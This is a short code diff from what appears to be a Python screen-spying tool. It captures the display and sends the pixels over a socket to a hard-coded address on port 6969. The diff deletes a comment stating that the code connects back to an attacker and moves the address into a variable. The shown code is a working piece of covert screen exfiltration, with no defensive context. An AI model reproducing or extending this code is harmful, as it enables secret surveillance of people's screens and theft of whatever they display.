@@ -12,6 +12,8 @@ print(screensize)
 
 import pygame
 
+ip = '192.168.86.204'
+
 WIDTH = screensize[0]
 HEIGHT = screensize[1]
 
@@ -38,8 +40,7 @@ def retreive_screenshot(conn):
             # Send pixels
             conn.sendall(pixels)
 x = socket.socket()
-def main(host='192.168.86.204', port=6969):
-    ''' connect back to attacker on port'''
+def main(host=ip, port=6969):
     sock = socket.socket()
     sock.connect((host, port))
     screen_data = '{0}x{1}'.format(screensize[0], screensize[1])
